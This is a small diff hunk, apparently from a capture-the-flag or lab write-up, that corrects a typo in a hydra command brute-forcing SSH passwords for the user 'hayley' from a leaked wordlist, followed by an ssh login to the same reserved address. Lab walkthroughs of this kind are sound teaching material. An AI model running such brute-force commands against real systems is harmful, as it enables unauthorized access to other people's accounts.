@@ -355,7 +355,7 @@ DLH4cgw
 bRBdPRk
 ```
 ```
-hydar -l hayley -P passwords.bak ssh://240.0.0.1
+hydra -l hayley -P passwords.bak ssh://240.0.0.1
 ```
 ```
 ssh hayley@240.0.0.1             
